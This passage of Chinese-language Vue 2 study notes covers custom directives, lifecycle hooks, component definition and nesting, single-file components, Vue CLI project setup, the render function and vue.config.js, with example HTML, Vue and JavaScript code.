Vue.directive(指令名,配置对象);
// 或
Vue.directive(指令名,回调函数)
```

2. 配置对象中常用的3个回调：
   1. `bind`：指令与元素成功绑定时调用。
   2. `inserted`：指令所在元素被插入页面时调用。
   3. `update`：指令所在模板结构被重新解析时调用。
3. 备注：
   1. 指令定义时不加 `v-`，但使用时要加 `v-`；
   2. 指令名如果是多个单词，要使用 kebab-case 命名方式，不要用 camelCase 命名
4. `directive` 里的 `this` 是 `Window`
5. 一个自定义指令只能给一个 vue 实例使用

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
        
    <div id="root">

        <span v-text="num"></span><hr/>

        <!-- 需求1：定义一个 big 指令，和v-text功能类似，但会把绑定的数值放大10倍 -->
        <span v-big="num"></span><hr/>

        <!-- 需求2：定义一个 v-fbind 指令,和 v-bind 功能类似，但可以让其所绑定的 input 元素默认获取焦点  -->
        <input type="text" v-fbind:value="num">

        <!-- 
            自定义指令总结：
                一、定义语法：
                    (1).局部指令：
                        new Vue({new Vue({
                            directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
                        }) 																		})
                    (2).全局指令：
                            Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

                二、配置对象中常用的3个回调：
                    (1).bind：指令与元素成功绑定时调用。
                    (2).inserted：指令所在元素被插入页面时调用。
                    (3).update：指令所在模板结构被重新解析时调用。

                三、备注：
                    1.指令定义时不加v-，但使用时要加v-；
                    2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名.
        -->

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            num: 14
        },
        // 配置自定义指令
        directives: {
            // 函数方式；何时会被调用？
            //      1.指令与元素成功绑定时（一上来，并没有在页面渲染出来）。
            //      2.指令所在的模板被重新解析时。
            // 参数1：指令所在的真实 DOM 元素
            // 参数2：绑定对象；value：获取的数据的值
            big( element, binding ){
                element.innerText = binding.value * 10;
            },

            // 对象方式；写成对象方式的原因是使 vue 在固定的时间执行不同的代码；不然顺序会导致错误（比如先获取焦点在放入页面、先获取父元素在放入页面）
            fbind: {
                // 指令与元素成功绑定时（一上来）调用
                bind(element,binding){
                    element.value = binding.value;
                },
                // 指令所在元素被插入页面时调用
                inserted(element,binding){
                    element.focus();
                },
                // 指令所在的模板被重新解析时调用
                update(element,binding){
                    element.value = binding.value;
                }
            }
        }
    });

</script>

</html>
```

## 15、声命周期

### ①、生命周期简介

1. 生命周期又名：生命周期回调函数、生命周期函数、生命周期钩子
2. 生命周期是什么：Vue 在关键时刻帮我们调用的一些特殊名称的函数
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写
4. 生命周期函数中的 this 指向是 vm 或 组件实例对象

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
        
    <div id="root">

        <!-- 
        生命周期：
            1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
            2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
            3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
            4.生命周期函数中的this指向是vm 或 组件实例对象。
		-->
        <span :style="{opacity}">{{name}}</span><hr/>

        <button @click="stop">停止变换</button>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            name: '月海',
            opacity : 1
        },
        methods: {
            // 关闭定时器
            stop(){
                // 需求1：单纯关闭定时器
                // clearInterval(this.timer);

                // 需求2：关闭定时器并销毁 vue 实例（这种方式可以防止 vue 因为某些其他原因被销毁时进行善后操作）
                this.$destroy();
            }
        },

        // 生命周期； Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted
        // 只调用一次，即此处只开启一个定时器
        mounted() {
            // 将定此定时器添加到 this （vue实例）中，便于其他作用域的调用
            this.timer = setInterval(() => {
                this.opacity -= 0.01;
                if (this.opacity <= 0){
                    this.opacity = 1;
                }
            },16)
        },
        // vue 实例销毁前调用
        beforeDestroy() {
            // vue 实例销毁前关闭定时器
            clearInterval(this.timer);
        },
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-57-803--kkoGSpV4f95CRQ.png)

### ②、vue 生命周期分析

1. 初始化显示
   1. `beforeCreate()`
   2. `created()`
   3. `beforeMount()`
   4. `mounted()`
2. 更新状态：`this.xxx = value`
   1. `beforeUpdate()`
   2. `updated()`
3. 销毁 vue 实例:：`vm.$destory()`
   1. `beforeDestory()`
   2. `destoryed()`

---

1. 常用的生命周期钩子：
   1. `mounted`：发送 ajax 请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
   2. `beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
2. 关于销毁 Vue 实例
   1. 销毁后借助 Vue 开发者工具看不到任何信息。
   2. 销毁后自定义事件会失效，但原生 DOM 事件依然有效。
   3. 一般不会在 `beforeDestroy` 操作数据，因为即便操作数据，也不会再触发更新流程了。

![](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2FPasted%20image%2020230725125417.png)

# 三、Vue 组件化编程

## 1、模块化和组件化

### ①、模块

- 复用 js
1. 理解：向外提供特定功能的 js 程序，一般就是一个 js 文件
2. 为什么：js 文件很多很复杂
3. 作用：复用 js，简化 js 的编写，提高 js 运行效率

### ②、组件

- 复用 html
1. 理解：用来实现局部(特定)功能效果的代码集合(html/css/js/image…..)
2. 为什么：一个界面的功能很复杂
3. 作用：复用编码, 简化项目编码, 提高运行效率

### ③、模块化

- 当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用

### ④、组件化

- 当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-57-975--WRhFIyxbFXotFw.png)

## 2、非单文件组件

- 一个文件中包含有 n 个组件
1. 模板编写没有提示
2. 没有构建过程，无法将 ES6 转换成 ES5
3. 不支持组件的 CSS
4. 真正开发中几乎不用

---

1. Vue 中使用组件的三大步骤：
   1. 定义组件(创建组件)
   2. 注册组件
   3. 使用组件(写组件标签)
2. 如何定义一个组件？使用 `Vue.extend(options)` 创建，其中 `options` 和 `new Vue(options)` 时传入的那个 options 几乎一样，但也有点区别；
   1. `el` 不要写，为什么：最终所有的组件都要经过一个 vm 的管理，由 vm 中的 el 决定服务哪个容器。
   2. `data` 必须写成函数，为什么：避免组件被复用时，数据存在引用关系。
   3. 备注：使用 `template` 可以配置组件结构。
3. 如何注册组件？
   1. 局部注册：靠 new Vue 的时候传入 `components` 选项
   2. 全局注册：靠 `Vue.component('组件名',组件)`
4. 编写组件标签：`<school></school>`

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

		<!-- 
			Vue中使用组件的三大步骤：
                一、定义组件(创建组件)
                二、注册组件
                三、使用组件(写组件标签)

			一、如何定义一个组件？
                使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
                区别如下：
                    1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                    2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
                备注：使用template可以配置组件结构。

			二、如何注册组件？
                1.局部注册：靠new Vue的时候传入components选项
                2.全局注册：靠Vue.component('组件名',组件)

			三、编写组件标签：
                <school></school>
		-->
<body>
        
    <div id="root">
        <!-- 3、引入 school 组件 -->
        <school></school><hr/>

        <!-- 引入 student 组件 -->
        <student></student><hr/>
    </div>

    <div id="root2">
        <hello></hello>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 1、创建 school 组件
    const school = Vue.extend({
        // 组件定义时，一定不要写 el 配置项，因为最终所有的组件都要被一个 vm 管理，由 vm 决定服务于哪个容器。
        // template：html 模板，定义 html 基础结构；这就是不推荐使用非单文件组件的原因之一
        template: `
            <div>
                <h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
            </div>
        `,
        // 组件中的 data 一定要写成函数式
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京'
            }
        }
    });
    // 创建 student 组件
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
        `,
        data() {
            return {     
                studentName: '月海',
                age: 16
            }
        }
    });
    // 创建 hello 组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
            }
        })

    // 2、注册组件
    new Vue({
        el: '#root',
        // 注册组件
        components: {
            school, student
        }
    })
    // 组件全局注册
    Vue.component('hello',hello)

    new Vue({
        el:'#root2',
    })

</script>

</html>
```

## 3、组件的几个注意点

### ①、组件名

1. 一个单词组成：
   1. 第一种写法(首字母小写)：`school`
   2. 第二种写法(首字母大写)：`School`
2. 多个单词组成：
   1. 第一种写法(kebab-case命名)：`my-school`
   2. 第二种写法(CamelCase命名)：`MySchool` (需要Vue脚手架支持)
3. 备注：
   1. 组件名尽可能回避 HTML 中已有的元素名称，例如：h2、H2都不行。
   2. 可以使用name配置项指定组件在开发者工具中呈现的名字。

### ②、组件标签

1. 第一种写法：`<school></school>`
2. 第二种写法：`<school/>`
3. 备注：不用使用脚手架时，`<school/>`会导致后续组件不能渲染。

### ③、创建组件简写方式

- `const school = Vue.extend(options)` 可简写为：`const school = options`
- 组件注册时会进行判断，若传入的是对象 会自动创建 `Vue.extend`

## 4、组件的嵌套

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
        
    <div id="root"></div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;
    
    // 子组件必须在父组件之前创建
    // 创建 hello 组件
    const hello = Vue.extend({
        template:`
            <div>	
                <h2>你好啊！{{name}}</h2><hr/>
            </div>
        `,
        data(){
            return {
                name:'Tom'
            }
        }
    })
    // 创建 student 组件
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2><hr/>

                <!-- 引入 student 组件 -->
                <hello></hello>
            </div>
        `,
        data() {
            return {     
                studentName: '月海',
                age: 16
            }
        },
        // 注册组件
        components: { hello }
    });

    // 创建 school 组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2><hr/>

                <!-- 引入 student 组件 -->
                <student></student>
            </div>
        `,
        // 组件中的 data 一定要写成函数式
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京'
            }
        },
        // 注册组件
        components: { student }
    });

    // 定义 app 组件，管理所有组件
    const app = Vue.extend({
        // 引入组件
        template:`
            <div>	
                <school></school>
                <hello></hello>
            </div>
        `,
        components: { school, hello }
    })
    

    // 2、注册组件
    new Vue({
        el: '#root',
        template: `<app></app>`,
        // 注册组件
        components: { app }
    })

</script>

</html>
```

## 5、VueComponent

1. school 组件本质是一个名为 `VueComponent` 的构造函数，且不是程序员定义的，是 `Vue.extend` 生成的。
2. 我们只需要写`<school/>`或`<school></school>`，Vue 解析时会帮我们创建 school 组件的实例对象，即Vue帮我们执行的：`new VueComponent(options)`。
3. 特别注意：每次调用 `Vue.extend`，返回的都是一个全新的 `VueComponent` ！！！！
4. 关于 `this` 指向：
   1. 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是：VueComponent实例对象
   2. new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是：Vue实例对象
5. `VueComponent` 的实例对象，以后简称vc（也可称之为：组件实例对象）
6. `Vue` 的实例对象，以后简称 vm

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
        <!-- 
			关于 VueComponent：
                1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

                2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
                    即Vue帮我们执行的：new VueComponent(options)。

                3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

                4.关于this指向：
                    (1).组件配置中：
                        data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
                    (2).new Vue(options)配置中：
                        data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

                5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
                    Vue的实例对象，以后简称vm。
		-->
    <div id="root">
        <school></school><hr>
        <student></student>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;
    
    // 创建 school 组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
            </div>
        `,
        // 组件中的 data 一定要写成函数式
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京'
            }
        }
    });
    // 创建 student 组件
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
        `,
        data() {
            return {     
                studentName: '月海',
                age: 16
            }
        }
    });


    // 2、注册组件
    new Vue({
        el: '#root',
        // 注册组件
        components: { school, student }
    })

</script>

</html>
```

---

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
        <!-- 
			关于 VueComponent：
                1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

                2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
                    即Vue帮我们执行的：new VueComponent(options)。

                3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

                4.关于this指向：
                    (1).组件配置中：
                        data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
                    (2).new Vue(options)配置中：
                        data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

                5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
                    Vue的实例对象，以后简称vm。
		-->
    <div id="root">
        <school></school><hr>
        <student></student>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;
    
    // 创建 school 组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
            </div>
        `,
        // 组件中的 data 一定要写成函数式
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京'
            }
        }
    });
    // 创建 student 组件
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
        `,
        data() {
            return {     
                studentName: '月海',
                age: 16
            }
        }
    });


    // 2、注册组件
    const vm = new Vue({
        el: '#root',
        // 注册组件
        components: { school, student }
    })


    // 定义一个构造函数
    function Demo(){
        this.a = 1
        this.b = 2
    }
    // 创建一个 Demo 的实例对象
    const d = new Demo()

    //显示原型属性
    console.log(Demo.prototype) 
    //隐式原型属性
    console.log(d.__proto__) 
    console.log(Demo.prototype === d.__proto__)

    // 程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
    Demo.prototype.x = 99

    console.log('@',d)

    // school.prototype.__proto__ === Vue.prototype
    console.log( school.prototype.__proto__ === Vue.prototype  );

</script>

</html>
```

## 6、单文件组件

- 一个文件中只包含一个组件

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-107--B3HwH0u9H18MUw.png)

1. 创建 School 组件

```vue
<template>
    <!-- 网页结构 -->
    <div>
        <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // export default：默认暴露
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        name: 'School',
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京'
            }
        },
    }
</script>

<style>
    /* css 样式 */
    .dome{
        background-color: orange;
    }
</style>
```

2. 创建 Student 组件

```vue
<template>
    <!-- 网页结构 -->
    <div class="dome">
        <h2>学生姓名：{{ studentName }}</h2>
        <h2>学生年龄：{{ age }}</h2>
    </div>
</template>

<script>
    // js 代码
    // export default：默认暴露
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        name: 'student',
        data() {
            return {
                studentName: "月海",
                age: 16,
            };
        },
    }
</script>

<style>
    /* css 样式 */
    .dome{
        background-color: blue;
    }
</style>
```

3. 创建 App 组件

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School/>
        <Student/>
    </div>
</template>

<script>
    // js 引入组件
    import School from "./School.vue"
    import Student from "./Student.vue"

    // js 代码
    // export default：默认暴露
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

4. 创建 main.js 入口文件

```javascript
// js 引入 App 组件
import App from './App.vue'

// 创建 vue 实例
new Vue({
    // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
    // 但是因为此文件是 js 文件，不能写 html 容器，所以可以使用：template:`<App></App>`
    // 或者新建一个 index.html 文件，在其中创建 html 容器，并在其中引入 main.js 文件
    el: "#root",
    // vue 引入组件
    components: { App }
})
```

5. 创建 index.html 容器

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div id="root">
        <App></App>
    </div>
</body>

    <!-- 引入 vue.js -->
    <script type="text/javascript" src="../js/vue.js"></script>
    <!-- 引入 main.js 入口文件 -->
	<script type="text/javascript" src="./main.js"></script>

</html>
```

6. 此时还不能访问项目，因为浏览器无法解析 `ES6` 的语法，继续向下进行需要安装 `vue` 脚手架

# 四、Vue 脚手架

## 1、使用 `vue` 脚手架创建项目

**Vue CLI 现已处于维护模式!**
现在官方推荐使用 [create-vue](https://github.com/vuejs/create-vue) 来创建基于 [Vite](https://vitejs.dev/) 的新项目。另外请参考 [Vue 3 工具链指南](https://cn.vuejs.org/guide/scaling-up/tooling.html) 以了解最新的工具推荐

> [https://cli.vuejs.org/zh/#%E8%B5%B7%E6%AD%A5](https://cli.vuejs.org/zh/#%E8%B5%B7%E6%AD%A5)

1. 仅第一次执行，全局安装 @vue/cli：`yarn global add @vue/cli` 或 `npm install -g @vue/cli`

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-240--p_qT73wD6II-5Q.png)

2. 切换到你要创建项目的目录，然后使用命令创建项目
   1. 进入目录：`cd D:\Idea\save\html\0_study\vue2\'2、Vue 脚手架'`
   2. 创建项目：`vue create test01`
   3. 选择预设（使用上下键）：

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-379--gBpDw9mVpAg7bQ.png)

   4. 选择安装依赖项时要使用的包管理器：（使用上下键）：

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-498--cZCkTnx_1yRrzw.png)

   5. 开始安装
   6. 进入项目：`cd test01`
3. 启动项目：`yarn serve` 或 `npm run serve`
4. 访问项目：[http://172.20.2.88:8080/](http://172.20.2.88:8080/)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-611--u8SeF09ZhN5QYA.png)

5. 如出现下载缓慢请配置 npm 淘宝镜像：`npm config set registry https://registry.npm.taobao.org`
6. Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置，请执行：`vue inspect > output.js`

## 2、项目结构

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-775--IjFIdWATWwTbrQ.png)

- 将之前的代码复制过来

1. `School.vue`

```vue
<template>
    <!-- 网页结构 -->
    <div class="dome">
        <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // export default：默认暴露
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        name: 'School',
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京'
            }
        },
    }
</script>

<style>
    /* css 样式 */
    .dome{
        background-color: orange;
    }
</style>
```

2. `Student.vue`

```vue
<template>
    <!-- 网页结构 -->
    <div class="dome">
        <h2>学生姓名：{{ studentName }}</h2>
        <h2>学生年龄：{{ age }}</h2>
    </div>
</template>

<script>
    // js 代码
    // export default：默认暴露
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        name: 'student',
        data() {
            return {
                studentName: "月海",
                age: 16,
            };
        },
    }
</script>

<style>
    /* css 样式 */
    .dome{
        background-color: blue;
    }
</style>
```

3. `App.vue`

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 在网页中引入组件 -->
        <School/>
        <Student/>
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"

    // js 代码
    // export default：默认暴露
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

4. `main.js`

```javascript
/**
 * 该文件是整个 vue 项目的入口文件
 */

// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // render(craeteElement){
    //     // return craeteElement('h1', '月海')
    //     return craeteElement(App)
    // }
}).$mount('#app')

```

5. 在 `vue.config.js` 中关闭语法检查

```javascript
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
    transpileDependencies: true,
    // 关闭语法检查
    lintOnSave: false
})

```

6. `index.html`

```html
<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签的图标 -->
    <!-- <%= BASE_URL %>：项目根路径，防止写绝对路径导致部署后出现问题 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页的标题，会去 package.json 文件的 name 属性中寻找值 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
</head>

<body>
    <!-- noscript：当浏览器不支持 js 时，才会渲染 noscript 标签中的内容 -->
    <noscript>
        <strong>
            We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled.
            Please enable it to continue.
        </strong>
    </noscript>

    <!-- vue 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
</body>

</html>
```

7. 启动项目：`yarn serve`

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-786--aZ79Qb9QdzvL2g.png)

## 3、`render` 函数

1. 脚手架默认引入的是没有模板解析器的 `vue.runtime.xxx.js`，`vue.js` 与 `vue.runtime.xxx.js` 的区别：
   1. `vue.js` 是完整版的 Vue，包含：核心功能+模板解析器
   2. `vue.runtime.xxx.js` 是运行版的 Vue，只包含：核心功能；没有模板解析器
2. 因为 `vue.runtime.xxx.js` 没有模板解析器，所以不能使用 `template` 配置项，需要使用 `render` 函数接收到的 `createElement` 函数去指定具体内容

```javascript
/**
 * 该文件是整个 vue 项目的入口文件
 */

// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    // render: h => h(App),
    render(craeteElement){
        // return craeteElement('h1', '月海')
        return craeteElement(App)
    }
}).$mount('#app')

```

## 4、`vue inspect > output.js` 查看和修改具体的 webpakc 配置

### ①、查看

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-58-896--VMxmtLLoBtFfSA.png)

### ②、修改 `vue.config.js`

> 全局 CLI 配置：[https://cli.vuejs.org/zh/config/](https://cli.vuejs.org/zh/config/)

1. `vue.config.js` 是一个可选的配置文件，如果项目的 (和 `package.json` 同级的) 根目录中存在这个文件，那么它会被 `@vue/cli-service` 自动加载
2. 也可以使用 `package.json` 中的 `vue` 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。
3. 若是修改了这个文件，则一定要重新启动文件

```javascript
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
    transpileDependencies: true,
    // 关闭语法检查
    lintOnSave: false
})
```

## 5、`ref` 属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在 html 标签上获取的是真实 DOM 元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
